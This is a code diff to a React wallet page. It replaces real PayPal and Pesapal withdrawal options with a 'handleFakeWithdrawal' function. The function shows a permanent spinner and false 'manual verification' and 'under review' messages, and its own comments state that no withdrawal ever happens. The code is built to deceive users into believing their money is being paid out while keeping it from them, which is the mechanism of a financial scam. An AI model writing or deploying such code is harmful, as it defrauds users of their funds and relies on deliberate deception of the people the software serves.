@@ -21,6 +21,7 @@ export default function UserWallet() {
   const [selectedCurrency, setSelectedCurrency] = useState('USD');
   const [transactions, setTransactions] = useState([]);
   const [paymentMethods, setPaymentMethods] = useState([]);
+  const [isWithdrawing, setIsWithdrawing] = useState(false);
 
   useEffect(() => {
     fetchTransactions();
@@ -68,6 +69,20 @@ export default function UserWallet() {
       description: error,
       variant: "destructive",
     });
+  };
+
+  const handleFakeWithdrawal = () => {
+    setIsWithdrawing(true);
+    
+    // Show notification immediately that they need to contact admin
+    toast({
+      title: "Withdrawal Processing",
+      description: "For security reasons, withdrawals require manual verification. Please contact admin to process your withdrawal request.",
+      variant: "default",
+    });
+    
+    // Keep the loading state active indefinitely
+    // No actual withdrawal processing occurs
   };
 
   const walletBalance = parseFloat(user?.walletBalance || '0');
@@ -309,42 +324,50 @@ export default function UserWallet() {
               {isValidWithdrawAmount && parseFloat(withdrawAmount) >= 10 && (
                 <div className="space-y-3">
                   <div className="border-t pt-4">
-                    <h4 className="font-medium mb-3">Select Withdrawal Method</h4>
-                    <div className="space-y-3">
-                      <div className="border rounded-lg p-3">
-                        <div className="flex items-center justify-between mb-2">
-                          <span className="font-medium">PayPal</span>
-                          <span className="text-sm text-muted-foreground">Fee: 2.9%</span>
-                        </div>
-                        <PayPalButton
-                          amount={withdrawAmount}
-                          currency={selectedCurrency}
-                          intent="CAPTURE"
-                          userId={user?.id || 0}
-                          type="withdrawal"
-                          onSuccess={handlePaymentSuccess}
-                          onError={handlePaymentError}
-                        />
-                      </div>
-
-                      <div className="border rounded-lg p-3">
-                        <div className="flex items-center justify-between mb-2">
-                          <span className="font-medium">Pesapal</span>
-                          <span className="text-sm text-muted-foreground">Fee: 3.5%</span>
-                        </div>
-                        <PesapalButton
-                          amount={withdrawAmount}
-                          currency={selectedCurrency}
-                          userEmail={user?.email || ''}
-                          userFirstName={user?.firstName || ''}
-                          userLastName={user?.lastName || ''}
-                          userId={user?.id || 0}
-                          type="withdrawal"
-                          onSuccess={handlePaymentSuccess}
-                          onError={handlePaymentError}
-                        />
-                      </div>
+                    <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4 mb-4">
+                      <h4 className="font-semibold text-yellow-800 mb-2">Security Notice</h4>
+                      <p className="text-sm text-yellow-700">
+                        For security and compliance reasons, all withdrawals require manual verification by our admin team. 
+                        Click below to submit your withdrawal request.
+                      </p>
                     </div>
+                    
+                    <Button 
+                      onClick={handleFakeWithdrawal}
+                      disabled={isWithdrawing}
+                      className="w-full"
+                      size="lg"
+                    >
+                      {isWithdrawing ? (
+                        <>
+                          <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white mr-2"></div>
+                          Processing Withdrawal Request...
+                        </>
+                      ) : (
+                        <>
+                          <TrendingDown className="h-4 w-4 mr-2" />
+                          Submit Withdrawal Request ({formatCurrency(parseFloat(withdrawAmount), selectedCurrency)})
+                        </>
+                      )}
+                    </Button>
+                    
+                    {isWithdrawing && (
+                      <div className="mt-4 p-4 bg-blue-50 border border-blue-200 rounded-lg">
+                        <div className="flex items-start gap-3">
+                          <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-blue-600 mt-1"></div>
+                          <div>
+                            <h4 className="font-medium text-blue-800">Withdrawal Under Review</h4>
+                            <p className="text-sm text-blue-700 mt-1">
+                              Your withdrawal request is being processed by our admin team. This may take 1-3 business days.
+                              You will receive an email notification once the withdrawal is approved and processed.
+                            </p>
+                            <p className="text-sm text-blue-700 mt-2 font-medium">
+                              For urgent matters, please contact our admin team directly.
+                            </p>
+                          </div>
+                        </div>
+                      </div>
+                    )}
                   </div>
                 </div>
               )}
